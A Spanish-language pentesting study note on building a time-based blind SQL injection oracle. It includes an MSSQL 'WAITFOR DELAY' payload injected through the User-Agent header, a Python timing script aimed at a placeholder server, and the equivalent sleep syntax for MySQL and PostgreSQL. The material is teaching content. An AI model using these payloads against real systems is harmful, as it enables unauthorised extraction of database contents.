---
tags:
  - Web/Red-Team
  - SQLi
  - Pentesting/Explotacion
Descripción: "El oráculo temporal es conceptualmente idéntico al booleano —una función que responde True/False a una condición SQL—, pero cambia el indicador: en lugar de '¿cambió el…"
Fecha de actualización: 2026-06-04
Nota previa: "[[06 - Identificar SQLi basada en tiempo]]"
Nota siguiente: "[[08 - Extracción de datos time-based]]"
Area: "[[SQLi Blind.base|SQLi Blind]]"
---
---

El oráculo temporal es conceptualmente idéntico al [[03 - Diseño del oráculo booleano|booleano]] —una función que responde `True`/`False` a una condición SQL—, pero cambia el indicador: en lugar de "¿cambió el contenido?", la pregunta es "¿tardó más de lo normal?". Cuando la inyección en el `User-Agent` no devuelve resultados ni errores, este es el único canal.

# El oráculo: condicionar el retardo

Se hace que el servidor espere **solo si** la condición es verdadera, usando `IF`:

```sql
SELECT ... WHERE ... = 'Mozilla...'; IF (q) WAITFOR DELAY '0:0:5'--
```

- `q` verdadera → el servidor espera 5 s antes de responder.
- `q` falsa → responde de inmediato.

Probando `1=0` (falso) la respuesta es instantánea; con `1=1` (verdadero) llega con el retardo esperado. <mark style="background: #ADCCFFA6;">El mismo concepto sirve para cualquier consulta condicional</mark>.

# El oráculo en Python

La diferencia con el boolean está en la medición: se cronometra la petición y se compara con el umbral:

```python
#!/usr/bin/python3
import requests
import time

DELAY = 5   # segundos que esperará el servidor si `q` es verdadera (generoso para no confundir con latencia)

def oracle(q):
    start = time.time()
    r = requests.get(
        "http://SERVER_IP:8080/",
        headers={"User-Agent": f"';IF({q}) WAITFOR DELAY '0:0:{DELAY}'--"}
    )
    return time.time() - start > DELAY

assert oracle("1=1")        # debe tardar > DELAY  → True
assert not oracle("1=0")    # debe responder ya    → False
```

Los `assert` validan el oráculo igual que en boolean: si `1=1` no tarda, el contexto de inyección está mal y hay que corregirlo antes de extraer.

# El trade-off del `DELAY`

<mark style="background: #8000E1A6;">La elección del `DELAY` es el ajuste crítico del time-based</mark>:

- **DELAY corto** (1 s): el volcado es rápido, pero <mark style="background: #FFB86CA6;">un servidor que responde lento puntualmente puede parecer un `True`</mark> → falsos positivos que corrompen el dato.
- **DELAY largo** (5-10 s): mucho más fiable (el retardo destaca del ruido), pero el volcado tarda proporcionalmente más.

> [!warning]+
> Ajusta el `DELAY` a la latencia real del objetivo (red, VPN). Una mejora robusta es usar un **umbral con margen** en vez de `> DELAY` exacto: por ejemplo `> DELAY * 0.9`, para absorber el jitter de medición sin dar falsos negativos. En entornos muy ruidosos, repite cada pregunta dudosa.

> [!warning]+
> <mark style="background: #FF5582A6;">El multithreading que aceleraba el boolean es traicionero aquí</mark>: si lanzas peticiones con `WAITFOR` en paralelo, los retardos pueden encolarse en el servidor o solaparse en tu medición, falseando los tiempos. El time-based suele ejecutarse con baja o nula concurrencia. Esto lo hace inevitablemente lento —razón de más para preferir boolean cuando exista cualquier diferencia de contenido—.

> [!info]+
> En MSSQL se usa `IF(q) WAITFOR DELAY`. En MySQL el patrón equivalente es `q AND SLEEP(n)` o `IF(q, SLEEP(n), 0)`; en PostgreSQL, `CASE WHEN q THEN PG_SLEEP(n) ELSE ... END`. La lógica del oráculo no cambia, solo la sintaxis de la espera condicional.

Con el oráculo temporal validado, la extracción usa exactamente los [[05 - Optimización de la extracción|algoritmos optimizados]] (bisección, SQL-anding) —aquí no son un lujo sino una necesidad, porque cada petición cuesta segundos—: [[08 - Extracción de datos time-based]].
